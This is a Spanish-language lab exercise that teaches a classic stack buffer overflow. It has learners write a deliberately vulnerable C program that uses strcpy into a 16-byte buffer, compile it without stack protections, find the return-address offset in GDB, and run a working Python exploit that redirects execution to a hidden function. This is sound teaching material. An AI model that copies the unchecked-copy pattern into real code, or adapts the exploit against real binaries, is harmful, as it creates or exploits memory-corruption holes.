# Ejercicio 04: Buffer Overflow - Crear Exploit Funcional

## Lectura Previa Obligatoria

Antes de comenzar este ejercicio, asegúrate de haber leído:
- **Lección 06: Buffer Overflow** (`01-teoria/leccion_06.md`)

En esa lección aprendiste:
- Qué es un buffer overflow en memoria
- Qué es el return address y dónde está en el stack
- Qué es little endian y cómo afecta el payload
- Qué protecciones existen y por qué las desactivamos aquí

Este ejercicio es la práctica directa de esa teoría.

---

## Objetivos

- Explotar un buffer overflow real
- Sobrescribir el return address con una dirección controlada
- Llamar a una función arbitraria
- Verificar el exploit con GDB

## Tiempo Estimado

75-90 minutos

## Dificultad

⭐⭐⭐ Intermedio-Avanzado

---

## Parte 1: Crear el Programa Vulnerable

```bash
cd ~/SnowCrash/02-practicas/nivel_01

cat > objetivo.c << 'EOF'
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

// Esta función NO se llama normalmente - es nuestro objetivo
void funcion_privilegiada() {
    printf("¡¡¡ HAS GANADO !!!\n");
    printf("Función privilegiada ejecutada\n");
    exit(0);
}

void procesar_entrada(char *entrada) {
    char buffer[16];
    printf("[*] Dirección de buffer:              %p\n", (void *)&buffer);
    printf("[*] Dirección de funcion_privilegiada: %p\n", (void *)funcion_privilegiada);

    strcpy(buffer, entrada);  // VULNERABLE: sin verificar tamaño
}

int main(int argc, char **argv) {
    if (argc < 2) {
        printf("Uso: %s <entrada>\n", argv[0]);
        return 1;
    }
    procesar_entrada(argv[1]);
    printf("Función retornó normalmente\n");
    return 0;
}
EOF
```

### Compilar SIN protecciones

```bash
gcc -g -O0 \
    -fno-stack-protector \
    -z execstack \
    -no-pie \
    -o objetivo objetivo.c
```

Recuerda de Lección 06 por qué cada flag:
- `-fno-stack-protector` → sin canario
- `-no-pie` → direcciones fijas (sin ASLR)
- `-z execstack` → stack ejecutable

---

## Parte 2: Observar el Comportamiento Normal

```bash
./objetivo "hola"
```

Output esperado:
```
[*] Dirección de buffer:               0x7ffffffde4c0
[*] Dirección de funcion_privilegiada: 0x400556
Función retornó normalmente
```

**Anota las dos direcciones que aparecen. Las necesitarás.**

Ahora prueba con un input largo:

```bash
./objetivo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
```

El programa crashea. El return address fue sobrescrito con A's (`0x4141414141414141`) y el CPU no puede saltar ahí.

---

## Parte 3: Encontrar el Offset al Return Address

Necesitas saber cuántos bytes escribir para llegar exactamente al return address.

### Método: Patrón con letras distintas

```bash
./objetivo "AAAABBBBCCCCDDDDEEEEFFFFGGGG"
```

Luego en GDB:

```bash
gdb ./objetivo
(gdb) run "AAAABBBBCCCCDDDDEEEEFFFFGGGG"
(gdb) backtrace
#0  0x4747474747474747 in ?? ()
```

El valor `0x47` es `G` en ASCII. Eso significa que las `G`s sobrescribieron el return address.

Cuenta los bytes antes de las G's:
```
AAAA BBBB CCCC DDDD EEEE FFFF = 24 bytes
```

**Offset = 24 bytes** (16 del buffer + 8 del saved rbp).

### Verificar el offset con GDB

```bash
gdb ./objetivo
(gdb) break procesar_entrada
(gdb) run "AAAAAAAAAAAAAAAAAAAAAAAA"   # exactamente 24 A's

(gdb) x/30x $rsp
# Verás 24 A's (0x41) y luego el return address original
```

---

## Parte 4: Construir el Exploit

Con el offset sabido (24), construye el payload:

```
payload = [24 bytes relleno] + [dirección de funcion_privilegiada]
```

La dirección la viste en Parte 2. Usa la que imprimió **tu** programa (puede diferir).

Crea el script:

```bash
cat > exploit.py << 'EOF'
#!/usr/bin/env python3
from struct import pack
import subprocess

# Cambia esta dirección por la que imprimió TU programa
funcion_privilegiada = 0x400556

offset = 24  # 16 buffer + 8 saved rbp

# Construir payload
payload = b"A" * offset
payload += pack("<Q", funcion_privilegiada)  # little endian, 8 bytes

print("[*] Payload (hex):", payload.hex())
print("[*] Longitud:", len(payload))

# Ejecutar exploit
resultado = subprocess.run(
    ["./objetivo", payload],
    capture_output=True
)
print("[*] Output:")
print(resultado.stdout.decode(errors="replace"))
EOF

chmod +x exploit.py
python3 exploit.py
```

### Output esperado si el exploit funciona

```
[*] Payload (hex): 414141...0056400000000000
[*] Longitud: 32
[*] Dirección de buffer:               0x7ffffffde4c0
[*] Dirección de funcion_privilegiada: 0x400556
¡¡¡ HAS GANADO !!!
Función privilegiada ejecutada
```

---

## Parte 5: Verificar con GDB

Para ver exactamente lo que pasó:

```bash
gdb ./objetivo
(gdb) break procesar_entrada
(gdb) run $(python3 -c "
from struct import pack
import sys
payload = b'A'*24 + pack('<Q', 0x400556)
sys.stdout.buffer.write(payload)
")

# Avanzar hasta después de strcpy
(gdb) next
(gdb) next

# Ver el stack - deberías ver A's seguidas de la dirección
(gdb) x/30x $rsp

# Ver qué hay en el return address
(gdb) x/1gx $rbp+8
# Debería mostrar: 0x0000000000400556
```

---

## Checkpoints

✅ Completaste cuando:

- [ ] Compilaste objetivo.c sin protecciones
- [ ] Viste las direcciones impresas por el programa
- [ ] Provocaste el crash con input largo
- [ ] Encontraste el offset (24 bytes) con el patrón de letras
- [ ] Creaste exploit.py con la dirección correcta
- [ ] Viste "¡¡¡ HAS GANADO !!!" en la salida
- [ ] Verificaste en GDB que el return address fue sobrescrito

---

## Desafío Extra

### Nivel 1: Encontrar el offset automáticamente

En lugar de contar manualmente, escribe un script que pruebe offsets crecientes:

```python
import subprocess

for offset in range(16, 33):
    payload = b"A" * offset + b"BBBBBBBB"
    resultado = subprocess.run(["./objetivo", payload], capture_output=True)
    if b"HAS GANADO" not in resultado.stdout:
        stderr = resultado.stderr.decode(errors="replace")
        if "Segmentation" in stderr or resultado.returncode != 0:
            print(f"Offset candidato: {offset}")
```

### Nivel 2: Cambiar la dirección objetivo

Modifica exploit.py para llamar a `main()` en lugar de `funcion_privilegiada`.
Usa GDB para obtener la dirección de `main`:

```bash
gdb ./objetivo
(gdb) print main
$1 = {int (int, char **)} 0x400580 <main>
```

### Nivel 3: Observar la diferencia con protecciones activadas

```bash
gcc -g -O0 -o objetivo_seguro objetivo.c  # Con canario activado
./objetivo_seguro "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
# ¿Qué mensaje diferente aparece?
```

---

## Lecturas Relacionadas

- `01-teoria/leccion_06.md` - Teoría completa del buffer overflow
- `recursos/gdb-guia.md` - Sección "Debugging de Vulnerabilidades"

## Siguiente

**Leer Lección 07** (Format Strings) antes de continuar con Ejercicio 05.
